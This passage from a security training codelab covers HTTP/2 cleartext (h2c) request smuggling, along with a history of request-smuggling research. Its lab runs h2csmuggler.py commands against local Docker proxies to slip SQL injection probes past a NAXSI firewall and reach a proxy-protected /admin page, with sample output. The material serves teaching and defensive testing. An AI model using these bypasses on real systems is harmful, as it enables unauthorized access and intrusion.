[classpath:/application.properties]&#34;:{&#34;server.port&#34;:&#34;8081&#34;}}
</code></pre>
<p>You can now explore any URL that the proxy would forbid.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1 Upgrade to HTTP/2 cleartext" duration="6">
        <p>HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket.</p>
<h2 is-upgraded>HTTP 2 Handshake Sequence</h2>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\9c1af04a41ae7fe4.png"></p>
<h2 is-upgraded>Potential abuses</h2>
<p>Just like the technique with the WebSocket upgrade, it is possible to create a request that will not be analyzed by the load balancer. Any special processing such as URL filtering could be bypassed.</p>
<p>It can also be an opportunity for an attacker to bypass a Web Application Firewall. We are going to this scenario in practice in the fourth exercise.</p>
<p><strong>References:</strong></p>
<ul>
<li>https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c</li>
<li>https://blog.assetnote.io/2021/03/18/h2c-smuggling/</li>
<li>https://portswigger.net/daily-swig/h2c-smuggling-proves-effective-against-azure-cloudflare-access-and-more</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext (part 1)" duration="10">
        <p>For this lab, we are going use h2c protocol to &#34;smuggle&#34; HTTP2 requests that will be ignored by Web Application Firewall (WAF).</p>
<p class="image-container"><img alt="lab 4 diagram" src="img\\fecf5a7e03be631a.png"></p>
<h2 is-upgraded>Launching the application</h2>
<p>You need to launch the application using the following commands:</p>
<pre><code>&gt; cd 04_http2_cleartext
&gt; docker-compose up
</code></pre>
<p>Open <a href="https://localhost:8443" target="_blank">https://localhost:8443</a> in a browser to confirm that everything is running.</p>
<h2 is-upgraded>Scenario 1: Bypassing WAF</h2>
<p>Visit <code>https://localhost:8443/movie?id=1</code>. If you attempt to tamper with the parameter <code>id</code>, you will see that it is filtered by a Web Application Firewall. In this case, NAXSI is configured in front of the web application. Exploiting some vulnerabilities can be much harder <em>(see impossible)</em> when a strong firewall is in place. By default, NAXSI is configured to block all quotes <code>'</code> characters. However, with the HTTP 2 Cleartext passthrough we just learned, it is possible to send requests that would not be seen by the firewall.</p>
<h2 is-upgraded>Validation</h2>
<p>First, we need to validate that HTTP2 cleartext is supported by the backend. If the backend application does not support it, this technique will not work.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling
</code></pre>
<h2 is-upgraded>Exploitation</h2>
<p>When testing for SQL injection, a tester will be blocked right away by the Web Application Firewall in place.</p>
<p><code>http://127.0.0.1/movie?id=1'</code> (see single quote at the end)</p>
<p class="image-container"><img alt="NAXSI" src="img\\1720e65486903174.png"></p>
<p>We can use the HTTP2 technique to establish an HTTP tunnel with the application directly that will not be interpreted by most proxies.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;http://127.0.0.1/movie?id=1&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 &#34;https://127.0.0.1/?genre=action&#39; or &#39;&#39;=&#39;&#34;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /movie?id=1&#39;
[...]
</code></pre>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 4: Upgrade to HTTP/2 cleartext (part 2)" duration="10">
        <h2 is-upgraded>Scenario 2: Accessing forbidden /admin page</h2>
<p>The same infrastructure to test proxy-level access bypass. The application has an administrative page that is intended only for system administrators. The control is enforced by the proxy. Therefore, if one request is not interpreted by the proxy, the access control will not be enforced.</p>
<pre><code>python h2csmuggler.py -x https://127.0.0.1:8443 http://127.0.0.1/admin&#39;
[INFO] h2c stream established successfully.
:status: 200
[...]
[INFO] Requesting - /admin&#39;
[...]
</code></pre>
<aside class="special"><p>Don&#39;t forget that the second URL use the port exposed by the web application on the <em>internal network</em>. It might not be 80. You can try port such as <code>5000</code>, <code>8000</code> and <code>8080</code>. Since the tunnel is established with the backend server, the host and port might be ignored on the remote application.</p>
</aside>
<h2 is-upgraded>Additional testing possible</h2>
<p>This lab allows you to exploit the same vulnerability on 3 proxies. These are HAProxy, nginx (without NAXSI) and Nuster.</p>
<table>
<tr><td colspan="1" rowspan="1"><p>TCP port</p>
</td><td colspan="1" rowspan="1"><p>Description</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8001</p>
</td><td colspan="1" rowspan="1"><p>HAProxy -&gt; h2c backend (Insecure default configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8002</p>
</td><td colspan="1" rowspan="1"><p>nginx -&gt; h2c backend  (Insecure custom configuration)</p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p>8003</p>
</td><td colspan="1" rowspan="1"><p>Nuster -&gt; HAProxy -&gt; h2c backend (Insecure configuration with multiple layers of proxies)</p>
</td></tr>
</table>
<p>Changing the port to 8001, 8002 and 8003 can confirm that these two others servers are also vulnerable.</p>
<pre><code>&gt;python h2csmuggler.py -x https://127.0.0.1:8001 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8001 can be used for tunneling

&gt;python h2csmuggler.py -x https://127.0.0.1:8002 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8002 can be used for tunneling

&gt;python h2csmuggler.py -x https://127.0.0.1:8003 -t
[INFO] h2c stream established successfully.
[INFO] Success! https://127.0.0.1:8003 can be used for tunneling
</code></pre>
<p>You can see in the configuration of this workshop that it is using the latest version of each web proxy.</p>
<pre><code>[...]
image: haproxy:latest
[...]
image: nginx:latest
[...]
image: nuster/nuster:latest
[...]
</code></pre>


      </google-codelab-step>
    
      <google-codelab-step label="HRS History" duration="2">
        <p>The research on HRS has evolved over the past 15 years. While this vulnerability class is not exactly new, most of the development on the topic happens from 2019 to 2021.</p>
<h2 is-upgraded>Key researches</h2>
<h3 is-upgraded>2004: <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf" target="_blank">HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</a></h3>
<p><em>by Amit Klein</em></p>
<p>This first paper demonstrates the impact of desynchronizing response in an HTTP stream. While this is not Request Smuggling per say, it has very similar effects and impacts.</p>
<h3 is-upgraded>2005: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a></h3>
<p><em>by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</em></p>
<p>The &#34;HTTP Request Smuggling&#34; paper was the first to document the impacts of desynchronizing the HTTP pipeline. Those impacts include Web Cache Poisoning, Firewall/IPS/IDS evasion and Request Hijacking.</p>
<h3 is-upgraded>2016: <a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a></h3>
<p><em>by Regis Leroy (@regilero)</em></p>
<p>Multiple new variants were presented including newline confusion <code>\n</code> / <code>\r\n</code>, HTTP 0.9, typo in <code>Transfer-Encoding</code>, integer overflow for <code>Content-Length</code> and attribute truncation. The tool HTTPWookie was release to test proxies.</p>
<h3 is-upgraded>2019: <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a></h3>
<p><em>by James Kettle</em></p>
<p>In this article and research, James Kettle identifies numerous variations with the header <code>Transfer-Encoding</code>. Along the paper release, a Burp plugin named <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank">HTTP Request Smuggler</a> was released.</p>
<h3 is-upgraded>2019: <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a></h3>
<p><em>by Mikhail Egorov (@0ang3el)</em></p>
<p>This research introduces a very different approach to request smuggling. It does not involve a complete desynchronization of HTTP tunneling. Instead, it hides an HTTP/1.1 request inside an &#34;invalid&#34; WebSocket stream.</p>
<h3 is-upgraded>2020: <a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a></h3>
<p><em>by Jake Miller (@theBumbleSec)</em></p>
<p>Inspired by the WebSocket technique, Jake Miller found a new variant that abuse the capabilities of some backend application to support HTTP2 Cleartext protocol. This mode is started as a HTTP/1 over TLS. It then switches to a HTTP/2 after an upgrade request similar to the one used in WebSocket communication.</p>
<h3 is-upgraded>2021: <a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a></h3>
<p><em>by James Kettle</em></p>
<p>This recent development introduces implementation mistakes from a proxy that proxy from HTTP/2 to HTTP/1. The support for TLS or HTTP2 is often delegated to the load balancer. This facilitate the deployment of web applications. If the web application containers (NodeJS, .NET core, Jetty, Tomcat, etc) does not support HTTP/2, the proxy needs to convert HTTP/2 request headers to the HTTP/1 protocol. This conversion is subject to error if the HTTP/2 are not validated strictly.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Conclusion" duration="2">
        <p>Request Smuggling is a vulnerability that had numerous new developments in recent history. It will continue to exist as long as new variations are found and new HTTP parsers are implemented with similar mistakes.</p>
<p>If you are interested in testing your application infrastructure, <a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646" target="_blank">HTTP Request Smuggler</a> seems to be the most complete test suite at the moment. It is not recommended to use it on production systems. It could cause downtime if the probes are successful.</p>
<p>If you like the format of this workshop, we have produced three free workshops that can also be completed at your pace.</p>
<p><a href="https://gosecure.github.io/xxe-workshop/" target="_blank"><img alt="XXE Workshop" src="img\\b24171361cccb5ea.png"></a> <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/" target="_blank"><img alt="Binary Analysis Workshop" src="img\\2a5e6e709ef3d3c7.png"></a> <a href="https://gosecure.github.io/template-injection-workshop/" target="_blank"><img alt="Template Injection Workshop" src="img\\4889f8a64bc5cd91.png"></a></p>
<h2 is-upgraded>Documentation References</h2>
<ul>
<li>Watchfire Paper: <a href="https://doc.lagout.org/Others/EN-HTTP-Request-Smuggling.pdf" target="_blank">HTTP request smuggling</a> by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin</li>
<li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank">Hiding Wookiees in HTTP</a> by Regis Leroy (@regilero)</li>
<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">HTTP Desync Attacks: Request Smuggling Reborn</a> by James Kettle</li>
<li><a href="https://portswigger.net/research/http2" target="_blank">HTTP/2: The Sequel is Always Worse</a> by James Kettle</li>
<li><a href="https://bishopfox.com/blog/h2c-smuggling-request" target="_blank">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</a> by Jake Miller (@theBumbleSec)</li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by Mikhail Egorov (@0ang3el)</li>
</ul>
<h2 is-upgraded>Credits for code used in the infrastructure</h2>
<p>This workshop was create based on open-source projects and samples.</p>
<ul>
<li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc5" target="_blank">Docker samples for Apache Traffic Server</a> by Regis Leroy <a href="https://twitter.com/regilero" target="_blank">@regilero</a></li>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">HRS WebSocket POC</a> by Mikhail Egorov <a href="https://twitter.com/0ang3el" target="_blank">@0ang3el</a></li>
<li><a href="https://github.com/BishopFox/h2csmuggler" target="_blank">HRS HTTP/2 Cleartext POC</a> by Jake Miller (BishopFox) <a href="https://twitter.com/thebumblesec?lang=en" target="_blank">@thebumblesec</a></li>
<li><a href="https://github.com/Netflix/zuul" target="_blank">Zuul code sample</a> by Various Zuul/Netflix Developpers</li>
</ul>


      </google-codelab-step>
    
  </google-codelab>

  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
  <script src="//support.google.com/inapp/api.js"></script>

</body>
</html>
